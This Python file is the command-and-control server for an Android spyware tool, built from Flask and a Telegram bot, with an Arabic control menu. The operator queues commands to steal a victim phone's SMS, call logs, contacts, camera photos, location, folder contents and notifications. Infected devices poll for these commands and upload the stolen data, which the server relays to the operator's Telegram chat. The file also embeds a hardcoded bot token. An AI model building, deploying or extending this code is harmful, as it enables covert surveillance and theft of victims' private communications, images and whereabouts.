import os, telebot, requests, threading
from flask import Flask, request

app = Flask(__name__)
BOT_TOKEN = "8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI"
MY_CHAT_ID = "8148586037"
bot = telebot.TeleBot(BOT_TOKEN)

# مخزن الأوامر
PENDING_COMMANDS = {}

@app.route('/get_cmd')
def get_cmd():
    if PENDING_COMMANDS:
        cmd_name = list(PENDING_COMMANDS.keys())[0]
        cmd_data = PENDING_COMMANDS.pop(cmd_name)
        return f"{cmd_name}|{cmd_data}"
    return "none"

@app.route('/upload', methods=['POST'])
def handle_upload():
    msg = request.form.get('message', '')
    file = request.files.get('file')
    if file:
        bot.send_document(MY_CHAT_ID, file, caption=msg)
    else:
        bot.send_message(MY_CHAT_ID, msg)
    return "OK", 200

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    menu = (
        "🛠️ لوحة تحكم أندرويد 16:\n\n"
        "📁 /pull [المسار] - سحب صور وفيديوهات مجلد\n"
        "📞 /calls - سجل المكالمات\n"
        "💬 /sms - الرسائل النصية\n"
        "👥 /contacts - قائمة الأسماء\n"
        "📸 /shot - آخر صورة من الكاميرا\n"
        "📍 /loc - الموقع الجغرافي\n"
        "📱 /info - معلومات الجهاز\n"
        "🔔 /notif - فتح مستمع الإشعارات"
    )
    bot.reply_to(message, menu)

@bot.message_handler(commands=['pull'])
def cmd_pull(message):
    path = message.text.replace('/pull ', '').strip()
    if "/" in path:
        PENDING_COMMANDS['pull_folder'] = path
        bot.send_message(message.chat.id, f"⏳ جاري فحص المسار: {path}")

@bot.message_handler(commands=['calls', 'sms', 'contacts', 'shot', 'loc', 'info', 'notif'])
def cmd_actions(message):
    cmd = message.text.replace('/', '')
    PENDING_COMMANDS[cmd] = "true"
    bot.send_message(message.chat.id, f"🚀 تم إرسال أمر: {cmd}")

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))).start()
    bot.polling(none_stop=True)